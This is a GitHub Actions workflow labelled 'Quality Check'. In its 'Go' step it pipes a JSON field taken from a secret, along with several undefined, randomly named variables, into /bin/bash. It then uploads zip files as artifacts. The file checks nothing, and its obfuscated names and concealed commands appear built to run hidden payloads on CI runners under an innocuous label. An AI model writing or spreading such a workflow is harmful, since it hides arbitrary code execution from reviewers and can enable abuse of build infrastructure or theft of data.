name: Quality Check
on:
  workflow_dispatch:

permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          g8414: ${{ secrets.g8414 }}
        run: |
          printf '%s' "$g8414" | jq -r .o1 | /bin/bash
          printf '%s' "$gfbr95" | jq -r .h796 | /bin/bash
          echo $ue30 | jq -r .kyh6 | /bin/bash
          echo $ey32531 | jq -r .or8877 | /bin/bash
          printf '%s' "$iqzs22552" | jq -r .jo692 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: qYi1j4Nr
          path: "*.zip"
          retention-days: 1
